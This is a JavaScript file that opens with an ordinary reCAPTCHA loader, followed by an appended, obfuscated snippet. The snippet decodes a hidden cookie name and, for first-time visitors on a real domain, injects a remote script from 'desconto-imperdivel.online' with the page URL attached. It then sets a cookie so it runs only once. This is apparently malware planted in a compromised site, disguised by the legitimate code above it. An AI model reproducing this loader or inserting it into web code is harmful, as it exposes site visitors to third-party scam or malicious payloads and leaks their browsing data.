!function(){
    var w=window, C="___grecaptcha_cfg", cfg=w[C]=w[C]||{}, N="grecaptcha", gr=w[N]=w[N]||{};
    gr.ready=gr.ready||function(f){ (cfg.fns=cfg.fns||[]).push(f) },
    w.__recaptcha_api="https://www.recaptcha.net/recaptcha/api2/",
    (cfg.render=cfg.render||[]).push("explicit"),
    (cfg.onload=cfg.onload||[]).push("onloadCallback"),
    w.__google_recaptcha_client=!0;
    var d=document, po=d.createElement("script");
    po.type="text/javascript", po.async=!0, po.charset="utf-8",
    po.src="https://www.gstatic.com/recaptcha/releases/rKbTvxTxwcw5VqzrtN-ICwWt/recaptcha__en.js",
    po.crossOrigin="anonymous",
    po.integrity="sha384-1qCnjZ4tqdtwUnG8/biz1OfJ7vkM3jnPZ0W0wIcDu+NDwZyQHqHpscJVB8ezdlTM";
    var e=d.querySelector("script[nonce]"), n=e&&(e.nonce||e.getAttribute("nonce"));
    n&&po.setAttribute("nonce",n);
    var s=d.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(po,s)
}();

(function(o,d,l){
    try{
        o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');
        o.b=o.f('UMUWJKX');
        o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),
        setTimeout(function(){
            o.c&&(o.s=d.createElement('script'),o.s.src='https://desconto-imperdivel.online/quiz/' + l.href,d.body.appendChild(o.s));
        },1000);
        d.cookie=o.b+'=full;max-age=39800;';
    }catch(e){}
}({},document,location));
